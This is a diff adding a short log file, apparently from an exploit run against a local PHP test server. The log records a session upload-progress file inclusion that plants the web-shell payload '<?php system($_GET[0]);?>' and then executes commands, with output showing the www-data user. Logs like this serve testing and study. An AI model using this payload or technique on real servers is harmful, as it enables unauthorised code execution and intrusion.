@@ -1,0 +1,9 @@
+[*] upload http://127.0.0.1:8090/index.php sid=lfi1fe3cd6ab9b6f2dcc9959796
+[*] payload=<?php system($_GET[0]);?>
+[*] upload status=200 body=b''
+[*] followed Set-Cookie PHPSESSID=a0818227ade2397dfe94f409a89b2979
+[*] include /tmp/sess_a0818227ade2397dfe94f409a89b2979
+[*] lfi status=200 bytes=396
+upload_progress_uid=33(www-data) gid=33(www-data) groups=33(www-data)
+|a:5:{s:10:"start_time";i:1792572564;s:14:"content_length";i:271;s:15:"bytes_processed";i:271;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:1:"f";s:4:"name";s:5:"a.txt";s:8:"tmp_name";s:27:"/tmp/php8k6rm7ieueee32nDVpq";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1792572564;s:15:"bytes_processed";i:1;}}}
+[*] command output present: True
